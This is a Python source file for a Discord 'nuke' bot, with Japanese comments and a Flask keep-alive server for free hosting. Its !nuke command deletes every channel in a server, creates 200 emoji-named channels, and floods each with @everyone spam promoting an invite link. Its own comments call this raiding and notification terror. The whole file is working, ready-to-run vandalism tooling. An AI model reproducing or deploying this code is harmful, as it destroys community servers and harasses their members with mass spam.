import os
import threading
import discord
from discord.ext import commands
from discord import app_commands, utils, ui
from flask import Flask, jsonify
import logging
import time
import random
import asyncio

# ログはうるせえから警告レベルに下げておけ
logging.basicConfig(level=logging.WARNING)

# --- 🚨 KeepAlive用: Flaskアプリの定義 ---
app = Flask(__name__)

# --- Discord Bot Setup ---
intents = discord.Intents.default()
# 荒らし機能のために必要なインテントをすべて有効にする
intents.guilds = True
intents.members = True 
intents.message_content = True 

# 🚨 Prefixを '!' に設定
bot = commands.Bot(command_prefix="!", intents=intents)

# 環境変数からの設定
try:
    DISCORD_BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN") 
    
    if not DISCORD_BOT_TOKEN:
        logging.error("FATAL ERROR: 'DISCORD_BOT_TOKEN' is missing. Fuck!")

except Exception as e:
    DISCORD_BOT_TOKEN = None
    logging.error(f"Initialization Error: {e}")


# ----------------------------------------------------
# --- 💀 最終破壊機能 (即時実行 & 200チャンネル) ---
# ----------------------------------------------------

# コマンド名を 'nuke' に変更し、Prefixコマンドとして登録
@bot.command(name="nuke") 
@commands.has_permissions(administrator=True) # サーバーを破壊するには最高権限が必要だ！
async def ultimate_nuke_command(ctx): 
    
    guild = ctx.guild
    
    # 実行中メッセージを送信 (ただし、このチャンネルもすぐに削除される)
    await ctx.send(
        f"🔥🔥🔥 **INSTANT DELETION STARTED!** 猶予なし！{ctx.author.mention} の命令により、今すぐ全チャンネルを消し飛ばす！そして**200個**の絵文字の洪水を作り出す！ 🔥🔥🔥"
    )

    # 1. 全てのチャンネルを削除
    deletion_tasks = []
    for channel in guild.channels:
        deletion_tasks.append(asyncio.create_task(channel.delete()))
    
    try:
        await asyncio.gather(*deletion_tasks)
    except Exception as e:
        logging.error(f"チャンネル削除中にエラーが発生したぜ。: {e}")

    # 2. 絵文字チャンネルを200個作成
    creation_tasks = []
    
    # 🚨 チャンネル数を200個に増やす
    num_channels_to_create = 200
    
    EMOJIS = "😀😂🤣😇🤓🤪🤩🤔😈☠️💀😹" # 10種類の絵文字
    EMOJI_LIST = list(EMOJIS) 
    
    # チャンネル名生成ロジック: 10種類の絵文字をそれぞれ20回ずつ使う (10 * 20 = 200)
    channel_names = []
    for i in range(20): # 20回繰り返す
        for emoji in EMOJI_LIST: # 10種類の絵文字を順に使う
            channel_names.append(f"{emoji}-nuke-{i}") 
            
    num_channels = len(channel_names)
    logging.warning(f"🔨 CREATION STARTED! {num_channels}個の絵文字チャンネルを作成する！")

    # 作成タスクを並列で実行
    for name in channel_names:
        creation_tasks.append(asyncio.create_task(guild.create_text_channel(name)))
    
    successful_channels = []
    try:
        new_channels = await asyncio.gather(*creation_tasks)
        successful_channels = [c for c in new_channels if isinstance(c, discord.TextChannel)]
    except Exception as e:
        logging.error(f"チャンネル作成中にエラーが発生したぜ。: {e}")

    # 3. 全ての新しいチャンネルにスパムメッセージを15回送信
    if successful_channels:
        # 🚨 スパム内容
        spam_message_content = (
            "# @everyoneruru by nuke😂\n"
            "# ⬇️join now⬇️\n"
            "https://discord.gg/Uv4dh5nZz6\n"
            "https://imgur.com/NbBGFcf"
        )
        spam_count = 15
        
        await successful_channels[0].send(f"📣 **SPAM STARTED!** {len(successful_channels)}個の新しいチャンネルに、今から {spam_count}回 の**宣伝スパム**を送りつけるぞ！通知テロだ！")

        spam_tasks = []
        for channel in successful_channels:
            # チャンネルごとに15回メッセージを送信するタスクを作成
            async def send_spam_burst(ch, msg, count):
                for _ in range(count):
                    try:
                        await ch.send(msg)
                    except Exception:
                        pass
            
            spam_tasks.append(asyncio.create_task(send_spam_burst(channel, spam_message_content, spam_count)))
            
        try:
            await asyncio.gather(*spam_tasks)
        except Exception as e:
            logging.error(f"スパム送信中にエラーが発生したぜ。: {e}")

    # 4. 最終報告
    if successful_channels:
        await successful_channels[0].send(
            f"👑 **SERVER NUKE COMPLETE!** サーバーは {ctx.author.mention} によって再構築され、**絵文字と宣伝で汚染された**！\n"
            f"**最終作成チャンネル数**: {len(successful_channels)} 個だ！"
        )
    


# ----------------------------------------------------
# --- Discord イベント & 起動 (その他のコードは省略なし) ---
# ----------------------------------------------------

@bot.event
async def on_ready():
    """Bot起動時に実行"""
    await bot.change_presence(
        status=discord.Status.dnd,
        activity=discord.Game(name="サーバーを破壊中... !nuke")
    )
    logging.warning(f"Bot {bot.user} is operational and ready to cause chaos!")
    
    try:
        logging.warning("スラッシュコマンドは無視。!nukeコマンドが有効になったぜ。")
    except Exception as e:
        logging.error(f"コマンドの同期中にエラーが発生した: {e}")

@bot.event
async def on_message(message):
    """メッセージイベント"""
    if message.author.bot:
        return
        
    await bot.process_commands(message)


# ----------------------------------------------------
# --- Render/Uptime Robot対応: KeepAlive Server ---
# ----------------------------------------------------

def start_bot():
    """Discord Botの実行を別スレッドで開始する"""
    global DISCORD_BOT_TOKEN
    if not DISCORD_BOT_TOKEN:
        logging.error("Botの実行をスキップ: トークンが設定されてねえぞ。")
    else:
        logging.warning("Discord Botを起動中... 破壊の時だ。")
        try:
            bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
            
        except discord.errors.LoginFailure:
            logging.error("ログイン失敗: Discord Bot Tokenが無効だ！間違ってんじゃねえか？")
        except Exception as e:
            logging.error(f"予期せぬエラーが発生した: {e}")

bot_thread = threading.Thread(target=start_bot)
bot_thread.start()

@app.route("/")
def home():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    if bot.is_ready():
        return "Bot is running and ready for INSTANT NUKE!"
    else:
        return "Bot is starting up or failed to start... Get fucked!", 503

@app.route("/keep_alive", methods=["GET"])
def keep_alive_endpoint():
    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
    return jsonify({"message": "Alive. Now go break something."}), 200
